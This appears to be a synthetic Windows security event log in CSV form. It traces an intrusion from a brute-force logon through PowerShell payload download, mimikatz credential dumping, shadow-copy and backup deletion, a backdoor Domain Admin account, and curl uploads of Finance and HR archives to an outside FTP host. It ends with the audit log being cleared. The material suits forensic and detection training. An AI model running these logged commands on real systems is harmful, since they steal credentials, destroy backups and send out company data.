@@ -1,0 +1,66 @@
+TimeCreated,EventID,Channel,Computer,User,SourceIP,LogonType,Process,Description
+2026-05-08T07:42:11Z,4624,Security,WS-FINANCE-04,jdoe,192.168.10.42,2,explorer.exe,Successful logon - interactive
+2026-05-08T07:45:03Z,4624,Security,WS-FINANCE-04,jdoe,192.168.10.42,2,explorer.exe,Successful logon - interactive
+2026-05-08T08:01:22Z,4624,Security,WS-HR-02,mwhite,192.168.10.51,2,explorer.exe,Successful logon - interactive
+2026-05-08T08:12:45Z,4624,Security,WS-IT-01,admin_local,192.168.10.10,2,explorer.exe,Successful logon - interactive
+2026-05-08T09:30:17Z,4624,Security,WS-FINANCE-04,jdoe,192.168.10.42,3,svchost.exe,Successful logon - network
+2026-05-08T12:03:55Z,4624,Security,WS-FINANCE-04,jdoe,192.168.10.42,2,explorer.exe,Successful logon - interactive
+2026-05-09T02:14:08Z,4625,Security,DC-PRIMARY-01,administrator,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:11Z,4625,Security,DC-PRIMARY-01,administrator,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:14Z,4625,Security,DC-PRIMARY-01,administrator,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:17Z,4625,Security,DC-PRIMARY-01,administrator,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:20Z,4625,Security,DC-PRIMARY-01,administrator,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:23Z,4625,Security,DC-PRIMARY-01,admin,203.0.113.47,3,-,Failed logon - unknown user
+2026-05-09T02:14:26Z,4625,Security,DC-PRIMARY-01,root,203.0.113.47,3,-,Failed logon - unknown user
+2026-05-09T02:14:29Z,4625,Security,DC-PRIMARY-01,sa,203.0.113.47,3,-,Failed logon - unknown user
+2026-05-09T02:14:32Z,4625,Security,DC-PRIMARY-01,sqlservice,203.0.113.47,3,-,Failed logon - unknown user
+2026-05-09T02:14:35Z,4625,Security,DC-PRIMARY-01,backup,203.0.113.47,3,-,Failed logon - unknown user
+2026-05-09T02:14:38Z,4625,Security,DC-PRIMARY-01,test,203.0.113.47,3,-,Failed logon - unknown user
+2026-05-09T02:14:41Z,4625,Security,DC-PRIMARY-01,guest,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:44Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:47Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:50Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:53Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:56Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:14:59Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:02Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:05Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:08Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:11Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:14Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:17Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:20Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:23Z,4625,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Failed logon - bad password
+2026-05-09T02:15:26Z,4624,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,svchost.exe,Successful logon - network
+2026-05-09T02:15:44Z,4672,Security,DC-PRIMARY-01,jdoe,203.0.113.47,3,-,Special privileges assigned to new logon
+2026-05-09T02:17:02Z,4624,Security,WS-FINANCE-04,jdoe,203.0.113.47,10,-,Successful logon - RemoteInteractive
+2026-05-09T02:19:33Z,4688,Security,WS-FINANCE-04,jdoe,-,-,powershell.exe,Process created: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+2026-05-09T02:20:11Z,4688,Security,WS-FINANCE-04,jdoe,-,-,powershell.exe,Process created: powershell.exe Invoke-WebRequest -Uri http://198.51.100.23/payload.ps1
+2026-05-09T02:21:47Z,4688,Security,WS-FINANCE-04,jdoe,-,-,cmd.exe,Process created: cmd.exe /c whoami /all
+2026-05-09T02:22:15Z,4688,Security,WS-FINANCE-04,jdoe,-,-,cmd.exe,Process created: cmd.exe /c net user /domain
+2026-05-09T02:22:38Z,4688,Security,WS-FINANCE-04,jdoe,-,-,cmd.exe,Process created: cmd.exe /c net group Domain Admins /domain
+2026-05-09T02:23:09Z,4688,Security,WS-FINANCE-04,jdoe,-,-,cmd.exe,Process created: cmd.exe /c nltest /dclist:
+2026-05-09T02:25:51Z,4624,Security,DC-PRIMARY-01,jdoe,192.168.10.42,3,svchost.exe,Successful logon - network
+2026-05-09T02:26:20Z,4688,Security,DC-PRIMARY-01,jdoe,-,-,mimikatz.exe,Process created: mimikatz.exe privilege::debug sekurlsa::logonpasswords
+2026-05-09T02:28:44Z,4624,Security,DC-PRIMARY-01,administrator,192.168.10.42,3,svchost.exe,Successful logon - network
+2026-05-09T02:30:02Z,4672,Security,DC-PRIMARY-01,administrator,192.168.10.42,3,-,Special privileges assigned to new logon
+2026-05-09T02:32:17Z,4688,Security,DC-PRIMARY-01,administrator,-,-,cmd.exe,Process created: cmd.exe /c vssadmin delete shadows /all /quiet
+2026-05-09T02:33:55Z,4688,Security,DC-PRIMARY-01,administrator,-,-,cmd.exe,Process created: cmd.exe /c wbadmin delete catalog -quiet
+2026-05-09T02:35:11Z,4688,Security,DC-PRIMARY-01,administrator,-,-,cmd.exe,Process created: cmd.exe /c bcdedit /set {default} recoveryenabled No
+2026-05-09T02:36:48Z,4688,Security,DC-PRIMARY-01,administrator,-,-,rundll32.exe,Process created: rundll32.exe C:\Windows\Temp\svc_helper.dll Run
+2026-05-09T02:40:22Z,4624,Security,WS-HR-02,administrator,192.168.10.42,3,svchost.exe,Successful logon - network
+2026-05-09T02:40:25Z,4624,Security,WS-IT-01,administrator,192.168.10.42,3,svchost.exe,Successful logon - network
+2026-05-09T02:40:27Z,4624,Security,WS-FINANCE-04,administrator,192.168.10.42,3,svchost.exe,Successful logon - network
+2026-05-09T02:42:09Z,4688,Security,WS-HR-02,administrator,-,-,7za.exe,Process created: 7za.exe a -p[REDACTED] C:\Temp\hr_archive.7z C:\Users\
+2026-05-09T02:45:31Z,4688,Security,WS-FINANCE-04,administrator,-,-,powershell.exe,Process created: powershell.exe Compress-Archive -Path C:\Finance\ -DestinationPath C:\Temp\fin.zip
+2026-05-09T02:51:14Z,4688,Security,WS-FINANCE-04,administrator,-,-,curl.exe,Process created: curl.exe -T C:\Temp\fin.zip ftp://198.51.100.23/upload/
+2026-05-09T02:53:02Z,4688,Security,WS-HR-02,administrator,-,-,curl.exe,Process created: curl.exe -T C:\Temp\hr_archive.7z ftp://198.51.100.23/upload/
+2026-05-09T03:01:18Z,4720,Security,DC-PRIMARY-01,administrator,-,-,-,A user account was created: svc_backup_helper
+2026-05-09T03:01:45Z,4728,Security,DC-PRIMARY-01,administrator,-,-,-,Member added to security-enabled global group: Domain Admins / svc_backup_helper
+2026-05-09T03:04:33Z,7045,System,DC-PRIMARY-01,SYSTEM,-,-,services.exe,A new service was installed: WindowsUpdateHelper / C:\Windows\Temp\svc_helper.dll
+2026-05-09T03:08:51Z,1102,Security,DC-PRIMARY-01,administrator,-,-,-,The audit log was cleared
+2026-05-09T07:38:44Z,4624,Security,WS-FINANCE-04,jdoe,192.168.10.42,2,explorer.exe,Successful logon - interactive
+2026-05-09T07:55:12Z,4624,Security,WS-HR-02,mwhite,192.168.10.51,2,explorer.exe,Successful logon - interactive
+2026-05-09T08:10:09Z,4624,Security,WS-IT-01,admin_local,192.168.10.10,2,explorer.exe,Successful logon - interactive
+2026-05-09T09:22:48Z,4625,Security,DC-PRIMARY-01,jdoe,192.168.10.42,2,-,Failed logon - account locked out
+2026-05-09T09:23:01Z,4740,Security,DC-PRIMARY-01,SYSTEM,-,-,-,User account was locked out: jdoe
